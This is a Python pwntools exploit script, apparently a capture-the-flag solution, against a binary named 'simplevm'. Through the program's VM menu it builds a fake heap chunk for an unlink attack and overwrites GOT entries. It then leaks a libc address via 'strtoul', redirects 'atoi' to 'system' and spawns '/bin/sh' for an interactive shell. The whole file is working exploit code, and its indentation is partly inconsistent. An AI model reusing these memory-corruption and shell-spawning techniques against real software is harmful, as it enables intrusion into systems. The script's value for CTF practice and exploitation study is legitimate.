from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./simplevm")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./simplevm")
else:
	pass

def debugf():
	if debug:
		#gdb.attach(p,"b *0x4033B6\nb *0x400BB6\nb *0x4011e2\nb *0x4023d4")
		gdb.attach(p,"b *0x4033B6\nb *0x400BB6")

def menu(choice):
	p.sendlineafter("option--->>\n",str(choice))

def run_vm():
	menu(1)

def write_memory(index,length,content):
	menu(2)
	p.sendlineafter("addr:",str(hex(index)[2:]))
	p.sendlineafter("len:",str(hex(length)[2:]))
	p.send(content)

def read_memory(index,length):
	menu(3)
	p.sendlineafter("addr:",str(hex(index)[2:]))
	p.sendlineafter("len:",str(hex(length)[2:]))

def write_reg(index,value):
	menu(4)
	p.sendlineafter("regid:",str(hex(index)[2:]))
	p.sendline(str(hex(value)[2:]))

def read_reg(index):
	menu(5)
	p.sendlineafter("regid:",str(hex(index)[2:]))

def add_breakpoint(addr):
	menu(6)
	p.sendlineafter("addr:",str(hex(addr)[2:]))

def remove_breakpoint(addr):
	menu(7)
	p.sendlineafter("addr:",str(hex(addr)[2:]))

def read(index,offset = 0x100):
	write_reg(17,offset)
        write_reg(1,index)
        payload = chr(0xb) + chr(0x1) + p32(offset + 6 + 2) #6
        payload += chr(0xa) + chr(0x0) + p32(0x0) #18
        payload += chr(0x15)
        write_memory(offset,len(payload),payload)
        run_vm()

def write(index,value,offset = 0x100):
	write_reg(17,offset)
	write_reg(0,value)
	write_reg(1,index)
	payload = chr(0xb) + chr(0x1) + p32(offset + 6 + 2) #12
	payload += chr(0xb) + chr(0x0) + p32(0x0) #18
	payload += chr(0x15)
	write_memory(offset,len(payload),payload)
	run_vm()

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
for i in range(10):
	add_breakpoint(0xf)
debugf()
write(0x1008,0x100) #chunk_size
write(0x1000,0x1000)
target = 0x0000000000604170
payload = p64(0) + p64(0x1001)
payload += p64(target - 0x18) + p64(target - 0x10) + p64(0) * 2 
write_memory(0,len(payload),payload)
remove_breakpoint(0xf)
payload = p64(elf.got["strtoul"]) * 3 + p64(elf.got["atoi"])
write_memory(0,len(payload),payload)
read_reg(0)
info1 = p.recvuntil("\n",drop = True)
read_reg(1)
info2 = p.recvuntil("\n",drop = True)
leak_addr = int(info2 + info1,16)
libc.address = leak_addr - libc.symbols["strtoul"]
log.success("libc_base:" + hex(libc.address))
system = libc.symbols["system"]
payload = p64(libc.symbols["system"])[:7]
write_memory(0,len(payload),payload)
menu("/bin/sh")
p.interactive()
